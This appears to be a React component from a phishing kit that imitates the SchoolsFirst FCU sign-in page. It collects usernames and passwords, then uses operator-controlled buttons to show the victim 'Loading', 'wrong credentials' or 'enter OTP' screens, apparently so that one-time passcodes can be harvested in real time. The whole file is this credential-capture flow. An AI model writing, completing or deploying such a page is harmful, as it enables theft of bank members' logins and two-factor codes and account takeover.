import { useState } from "react";
import useForms from "../../../../../../../hooks/useForms";
import { CgClose } from "react-icons/cg";
import clsx from "clsx";
import { bankDetailsInfo } from "../../bankDetails";

const SchoolFirst = ({
  handleCancel,
  bankName,
  handleSubmit,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  mainCancel,
}) => {
  const { formState, handleChange } = useForms(bankDetailsInfo);
  const [otp, setOtp] = useState("");

  const onSumbitForm = () => {
    const newItems = {
      ...formState,
      bankName: bankName,
    };

    handleSubmit(newItems);
  };

  const handleVerifiedOtp = () => {
    setOtpOpen(true);
  };

  return (
    <div>
      <div>
        <div>
          <div>
            <div>img</div>
            <p>SchoolsFirst FCU - Sign In</p>
          </div>
          <CgClose size={20} onClick={handleCancel} />
        </div>
        <header>
          <div>img</div>
        </header>
        <div>
          <h2>Please enter your username and password below</h2>
          <div className={clsx(allBankOpen ? "hidden" : "block")}>
            <input
              type="text"
              value={formState.username}
              onChange={handleChange}
              name="username"
              placeholder="Username"
            />
            <input
              type="password"
              value={formState.password}
              name="password"
              placeholder="Password"
              onChange={handleChange}
            />
            <button onClick={onSumbitForm}>Log in</button>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <button>
                {whatToShowDetails.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedId(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSelectSubmit}>Submit</button>
              <div>
                {selectedPath.name === "Loading" && <p>{selectedPath.body}</p>}
                {selectedPath.name === "wrong" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <input
                        type="text"
                        value={formState.username}
                        onChange={handleChange}
                        name="username"
                        placeholder="Username"
                      />
                      <input
                        type="password"
                        value={formState.password}
                        name="password"
                        placeholder="Password"
                        onChange={handleChange}
                      />
                      <button onClick={onSumbitForm}>Log in</button>
                    </div>
                  </>
                )}
                {selectedPath.name === "otp" && (
                  <>
                    <h3>{selectedPath.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <button>
                {otpInfo.map((what) => (
                  <p key={what.id} onClick={() => handleSelectedOtp(what)}>
                    {what.name}
                  </p>
                ))}
              </button>
              <button onClick={handleSubmitOtp}>Submit</button>
              <div>
                {selectedOtp.name === "Loading" && <p>{selectedOtp.body}</p>}
                {selectedOtp.name === "wrong" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <div>
                      <input
                        type="text"
                        onChange={(e) => setOtp(e.target.value)}
                        value={otp}
                      />
                      <button onClick={handleVerifiedOtp}>Verify</button>
                    </div>
                  </>
                )}
                {selectedOtp.name === "otp" && (
                  <>
                    <h3>{selectedOtp.body}</h3>
                    <button onClick={() => mainCancel(false)}>Cancel</button>
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default SchoolFirst;
